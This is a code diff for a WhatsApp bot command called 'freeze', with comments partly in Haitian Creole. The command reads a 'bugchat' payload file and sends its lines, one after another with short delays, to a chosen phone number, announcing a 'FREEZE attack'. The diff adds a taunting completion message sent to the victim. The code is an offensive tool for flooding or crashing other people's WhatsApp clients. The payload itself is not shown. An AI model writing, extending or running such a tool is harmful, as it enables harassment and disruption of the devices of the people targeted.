@@ -1,6 +1,6 @@
 const { cmd } = require('../command');
 const config = require('../config');
-const bugchat = require('../../bug/izuka5.js'); // using bugchat as requested
+const bugchat = require('../bug/izuka5.js'); // ✅ verifye path la kòrèk
 
 cmd({
   pattern: 'freeze',
@@ -14,7 +14,7 @@ cmd({
     const botNumber = await bot.decodeJid(bot.user.id);
     const senderId = m.sender;
     const allowedUsers = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net', ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')];
-    const protectedNumbers = ['13058962443']; // Protected numbers
+    const protectedNumbers = ['13058962443']; // Numbers ki pa dwe atake
 
     const body = m.body || '';
     const cmdName = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
@@ -28,7 +28,6 @@ cmd({
     let targetNumber;
 
     if (m.isGroup) {
-      // If command used inside a group, target the sender
       targetNumber = senderId.split('@')[0];
     } else if (args.length > 0 && !isNaN(args[0])) {
       targetNumber = args[0];
@@ -36,7 +35,7 @@ cmd({
 
     if (!targetNumber) {
       return await bot.sendMessage(from, {
-        text: `❌ Usage:\n${prefix}freeze <number>\nOr use in group to target sender.`
+        text: `❌ Usage:\n${prefix}freeze <number>\nOu itilize l nan group pou vize moun nan.`
       }, { quoted: mek });
     }
 
@@ -49,7 +48,7 @@ cmd({
     const targetJid = `${targetNumber}@s.whatsapp.net`;
 
     await bot.sendMessage(from, {
-      text: `❄️ Launching FREEZE attack on +${targetNumber}... Please wait...`
+      text: `❄️ FREEZE attack launching on +${targetNumber}...`
     }, { quoted: mek });
 
     const lines = bugchat.split('\n').filter(Boolean);
@@ -61,8 +60,13 @@ cmd({
       await new Promise(resolve => setTimeout(resolve, 250));
     }
 
+    // ✅ Notifikasyon final pou target la tou
+    await bot.sendMessage(targetJid, {
+      text: `✅ *FREEZE COMPLETED*\n🔚 System freeze sent successfully.\n~INCONNU XD V2~`
+    });
+
     await bot.sendMessage(from, {
-      text: `✅ FREEZE attack successfully completed on +${targetNumber}.`
+      text: `✅ FREEZE attack sent successfully to +${targetNumber}.`
     }, { quoted: mek });
 
   } catch (error) {
